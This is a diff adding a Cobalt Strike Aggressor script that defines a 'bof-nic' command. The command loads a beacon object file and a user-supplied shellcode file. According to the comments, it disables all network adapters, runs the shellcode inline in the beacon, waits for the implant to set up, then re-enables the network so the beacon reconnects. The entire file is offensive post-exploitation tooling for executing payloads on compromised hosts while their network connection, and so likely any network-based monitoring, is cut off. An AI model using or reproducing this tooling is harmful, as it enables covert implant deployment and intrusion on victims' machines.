@@ -1,0 +1,56 @@
+# bof_nic_exec.cna
+#
+# Usage:  bof-nic <path_to_shellcode.bin> [cooldown_ms]
+#
+# Examples:
+#   bof-nic C:\bof\payload.bin
+#   bof-nic C:\bof\payload.bin 5000
+#   bof-nic "C:\bof\payload.bin" 10000
+#
+# Flow (single thread):
+#   1. Disable ALL NICs
+#   2. Execute shellcode inline (blocks until entry point returns)
+#   3. Sleep cooldown_ms  (give spawned implant time to set up)
+#   4. Re-enable NICs → beacon reconnects
+#
+# cooldown_ms default: 5000
+
+alias bof-nic {
+    local('$bofFile $bofData $scPath $scFile $scData $cooldown $args');
+
+    # Load BOF object
+    $bofFile = openf(script_resource("src\\bof_nic_exec.x64.obj"));
+    $bofData = readb($bofFile, -1);
+    closef($bofFile);
+
+    # Strip surrounding quotes if CS passes them through
+    $scPath = replace($2, '"', '');
+
+    if (strlen($scPath) == 0) {
+        berror($1, "Usage: bof-nic <shellcode_file> [cooldown_ms]");
+        return;
+    }
+    if (!-exists $scPath) {
+        berror($1, "File not found: " . $scPath);
+        return;
+    }
+
+    # Read shellcode bytes
+    $scFile = openf($scPath);
+    $scData = readb($scFile, -1);
+    closef($scFile);
+
+    if (strlen($scData) == 0) {
+        berror($1, "Shellcode file is empty: " . $scPath);
+        return;
+    }
+
+    # Cooldown (default 5000 ms)
+    $cooldown = iff(strlen($3) > 0, int($3), 5000);
+
+    blog($1, "[*] bof-nic: " . strlen($scData) . " bytes | cooldown=" . $cooldown . " ms");
+
+    # Pack: b=binary blob, i=int32
+    $args = bof_pack($1, "bi", $scData, $cooldown);
+    beacon_inline_execute($1, $bofData, "go", $args);
+}
